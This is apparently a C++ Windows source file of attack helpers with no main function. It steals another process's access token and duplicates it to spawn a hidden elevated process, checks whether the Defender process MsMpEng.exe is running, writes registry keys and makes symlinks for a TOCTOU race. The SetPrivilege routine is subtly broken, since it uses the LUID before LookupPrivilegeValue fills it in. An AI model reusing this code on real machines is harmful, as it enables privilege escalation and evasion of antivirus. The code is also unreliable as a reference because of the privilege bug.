#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <tlhelp32.h>
#include <direct.h>
#include <Shlobj.h>

using namespace std;

#pragma comment(lib, "user32.lib")


void CreateRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		HKEY hKeyResult;
		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
		RegCloseKey(hKey);
	}
}
void DeleteRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteKeyW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}

wstring GetCurrentFile() 
{
	char buff[MAX_PATH];
    GetModuleFileNameA( NULL, buff, MAX_PATH );
	string s(buff);
	return std::wstring(s.begin(), s.end());
}


DWORD GetPIDByName(const char *procname) 
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;	
	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;	
	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);	
	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);	
	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
	  // if we find the process: return process ID
	  if (strcmp(procname, pe.szExeFile) == 0) {
	    pid = pe.th32ProcessID;
	    break;
	  }
	  hResult = Process32Next(hSnapshot, &pe);
	}	
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

// set privilege
BOOL SetPrivilege(LPCTSTR priv) 
{
	HANDLE token;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	BOOL res = TRUE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
	if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
	printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
	return res;
}

// get access token
HANDLE GetToken(DWORD pid) 
{
	HANDLE cToken = NULL;
	HANDLE ph = NULL;
	if (pid == 0) {
		ph = GetCurrentProcess();
	} else {
		ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
	}
	if (!ph) cToken = (HANDLE)NULL;
	printf(ph ? "successfully get process handle :)\n" : "failed to get process handle :(\n");
	BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
	if (!res) cToken = (HANDLE)NULL;
	printf((cToken != (HANDLE)NULL) ? "successfully get access token :)\n" : "failed to get access token :(\n");
	return cToken;
}

// create process
BOOL CreateElevatedProcess(HANDLE token, LPWSTR app) 
{
	HANDLE dToken = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	BOOL res = TRUE;
	ZeroMemory(&si, sizeof(STARTUPINFOW));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
	printf(res ? "successfully duplicate process token :)\n" : "failed to duplicate process token :(\n");
	res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, NULL, app, (CREATE_DEFAULT_ERROR_MODE | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW), NULL, NULL, &si, &pi);
	printf(res ? "successfully create process :)\n" : "failed to create process :(\n");
	return res;
}

BOOL IsDefenderRunning() {
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE)
    return FALSE;

  PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
  BOOL found = FALSE;

  if (Process32First(hSnapshot, &pe32)) {
    do {
      if (_stricmp(pe32.szExeFile, "MsMpEng.exe") == 0) {
        found = TRUE;
        break;
      }
    } while (Process32Next(hSnapshot, &pe32));
  }
  CloseHandle(hSnapshot);
  return found;
}

BOOL CreateTestSymlink(const char *target, const char *link) {
  // Create a junction or symlink for TOCTOU simulation (safe test)
  if (!CreateSymbolicLinkA(link, target,
                           SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE |
                               SYMBOLIC_LINK_FLAG_DIRECTORY)) {
    if (GetLastError() != ERROR_PRIVILEGE_NOT_HELD) {
      printf("[!] Failed to create symlink: %lu\n", GetLastError());
      return FALSE;
    }
  }
  return TRUE;
}